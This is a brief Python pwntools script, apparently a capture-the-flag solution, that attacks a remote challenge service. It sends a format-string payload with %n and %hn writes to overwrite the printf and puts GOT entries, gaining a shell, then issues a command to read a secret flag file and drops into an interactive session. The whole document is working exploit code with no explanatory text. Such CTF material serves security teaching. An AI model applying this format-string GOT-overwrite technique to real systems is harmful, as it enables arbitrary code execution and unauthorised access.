from pwn import *
r = remote('csie.ctf.tw', 10134)
#r = remote('localhost', 10134)
print_got = 0x601030
puts_got = 0x601018
r.sendline("%13$n%64c%14$hn%15$n%1376c%16$hn%423c%17$hnaaaaaaaaaaaaa" + p64(print_got + 4) + p64(print_got + 2) + p64(puts_got + 2) + p64(print_got) + p64(puts_got) + "/bin/sh\x00")
r.send("cat /home/craxme/S3cretflag\n")
r.interactive()
